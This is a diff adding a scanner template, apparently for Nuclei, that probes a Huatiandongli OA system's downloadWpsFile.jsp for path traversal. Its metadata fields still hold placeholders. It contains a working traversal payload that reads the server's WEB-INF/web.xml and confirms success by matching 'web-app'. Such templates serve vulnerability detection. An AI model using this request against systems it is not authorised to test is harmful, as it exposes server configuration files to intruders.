@@ -1,0 +1,19 @@
+id: huatiandongli-downloadWpsFile-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'web-app'
